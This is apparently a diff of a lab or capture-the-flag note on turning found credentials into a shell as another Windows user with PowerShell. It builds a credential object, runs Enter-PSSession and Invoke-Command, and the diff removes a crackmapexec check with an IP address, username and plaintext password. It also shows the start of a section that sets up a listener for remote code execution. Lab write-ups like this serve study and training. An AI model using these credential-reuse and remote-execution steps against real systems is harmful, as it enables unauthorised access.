@@ -2,13 +2,6 @@
 when we found credentials of an user account in PS, we can utilize the following methodology to get shell as this user.
 
 ---
-
-First of all let's confirm that those creds are working, utilizing crackmapexec
-
-```
-crackmapexec smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM'
-```
-
 ## Creating Credential Object and logging into different user
 
 ```
@@ -24,8 +17,7 @@ Logging in
 Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
 ```
 
-
-
+---
 ## Create Credential Object
 
 ```
@@ -42,6 +34,7 @@ Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $cred
 sniper\chris
 ```
 
+---
 ## RCE
 
 Started up listener on port 8888
